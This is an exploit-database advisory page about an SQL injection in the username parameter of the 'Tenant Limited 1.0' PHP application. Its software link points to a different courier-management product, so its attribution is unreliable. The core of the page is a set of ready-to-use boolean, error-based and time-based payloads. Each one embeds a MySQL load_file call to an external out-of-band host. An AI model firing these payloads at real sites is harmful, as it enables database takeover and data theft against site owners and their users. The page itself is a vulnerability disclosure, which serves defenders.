---
title: Tenant Limited 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024050061
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-21
fetch_date: 2025-10-06T16:48:52.802022
---

# Tenant Limited 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenant Limited 1.0 SQL Injection** **2024.05.20**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Titles: TENANT-LIMITED-1.0 SQLi
## Author: nu11secur1ty
## Date: 05/20/2024
## Vendor: https://mayurik.com/
## Software:
https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The username parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select load\_file('\\\\
h7pme8qbgdftj9mizgk6u4aj0a63uuill9dw3ks.oastify.com\\lmh'))+' was submitted
in the username parameter. This payload injects a SQL sub-query that calls
MySQL's load\_file function with a UNC file path that references a URL on an
external domain. The application interacted with that domain, indicating
that the injected SQL query was executed. The attacker can get all
information from the system by using this vulnerability!
STATUS: HIGH- Vulnerability
[+]Exploits:
- SQLi Multiple:
```mysql
---
Parameter: username (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: username=nlWcgulD'+(select load\_file('\\\\
h7pme8qbgdftj9mizgk6u4aj0a63uuill9dw3ks.oastify.com\\lmh'))+'' OR NOT
7856=7856 OR 'qylg'='WmKA&password=q7L!w3j!P7
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
BY clause (FLOOR)
Payload: username=nlWcgulD'+(select load\_file('\\\\
h7pme8qbgdftj9mizgk6u4aj0a63uuill9dw3ks.oastify.com\\lmh'))+'' AND (SELECT
5737 FROM(SELECT COUNT(\*),CONCAT(0x716a767071,(SELECT
(ELT(5737=5737,1))),0x7171786b71,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) OR 'bruW'='pbdw&password=q7L!w3j!P7
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: username=nlWcgulD'+(select load\_file('\\\\
h7pme8qbgdftj9mizgk6u4aj0a63uuill9dw3ks.oastify.com\\lmh'))+'' AND (SELECT
4762 FROM (SELECT(SLEEP(7)))iyAW) OR 'ryQj'='epQU&password=q7L!w3j!P7
---
```
## Reproduce:
[href](https://www.patreon.com/posts/tenant-limited-1-104585030)
## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2024/05/tenant-limited-10-sqli.html)
## Time spent:
00:39:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050061)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top